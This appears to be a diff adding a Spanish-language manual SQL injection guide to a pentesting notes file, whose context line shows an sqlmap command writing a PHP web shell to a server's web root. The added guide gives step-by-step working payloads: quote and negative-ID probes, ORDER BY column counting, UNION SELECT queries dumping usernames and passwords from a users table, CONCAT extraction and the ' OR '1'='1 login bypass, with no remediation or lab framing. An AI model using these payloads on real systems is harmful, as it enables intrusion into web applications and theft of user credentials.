@@ -214,5 +214,107 @@ sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.
 ---
 
 
+# Guía Básica de Inyección SQL Manual (con UNION SELECT y técnicas comunes)
+
+---
+
+## ¿Qué es la inyección SQL manual?
+
+Es cuando el atacante introduce código SQL malicioso directamente en los campos de entrada o en la URL, para manipular las consultas y obtener información no autorizada, sin usar herramientas automáticas.
+
+---
+
+## Paso 1: Detectar la vulnerabilidad
+
+Inserta una comilla simple `'` en un parámetro de entrada (formulario, URL, etc.) y observa si la aplicación devuelve un error SQL o un comportamiento anómalo.
+
+Ejemplo URL vulnerable:
+
+http://ejemplo.com/product.php?id=1'
+
+Si devuelve error, es posible que sea vulnerable.
+
+
+Otra forma común es poner el número en negativo
+
+http://ejemplo.com/product.php?id=-1
+
+---
+
+## Paso 2: Identificar el número de columnas con ORDER BY
+
+Prueba consultas como:
+
+http://ejemplo.com/product.php?id=1 ORDER BY 1--
+http://ejemplo.com/product.php?id=1 ORDER BY 2--
+http://ejemplo.com/product.php?id=1 ORDER BY 3--
+...
+
+Cuando aparezca un error, el número anterior indica la cantidad correcta de columnas.
+
+---
+
+## Paso 3: Usar UNION SELECT para obtener datos
+
+El UNION SELECT permite combinar resultados de otra consulta para mostrar datos arbitrarios.
+
+Ejemplo para 3 columnas:
+
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3--
+
+Si ves 1, 2 y 3 en la página, la inyección funciona.
+
+---
+
+## Paso 4: Extraer datos reales
+
+Sustituye los números por columnas reales de una tabla, por ejemplo:
+
+http://ejemplo.com/product.php?id=1 UNION SELECT username, password, 3 FROM users--
+
+Esto mostrará los usuarios y contraseñas (o hashes) almacenados.
+
+---
+
+## Paso 5: Evitar errores y comentarios
+
+- Usa -- o # para comentar el resto de la consulta original y evitar errores de sintaxis.
+- Ajusta la inyección para no romper la consulta original.
+
+---
+
+## Ejemplo completo
+
+Consulta original:
+
+SELECT id, name, description FROM products WHERE id = '1'
+
+Inyección:
+
+1' UNION SELECT username, password, null FROM users--
+
+Aquí, null rellena la columna que no quieres mostrar.
+
+---
+
+## Otros trucos útiles
+
+- Usa funciones como CONCAT() para unir columnas:
+
+http://ejemplo.com/product.php?id=1 UNION SELECT CONCAT(username, 0x3a, password), null, null FROM users--
+
+(0x3a es el carácter : en hexadecimal)
+
+- Prueba inyecciones simples para verificar autenticación:
+
+' OR '1'='1
+
+- Comenta el resto para evitar errores:
+
+' OR '1'='1' --
+
+---
+
+
 
 
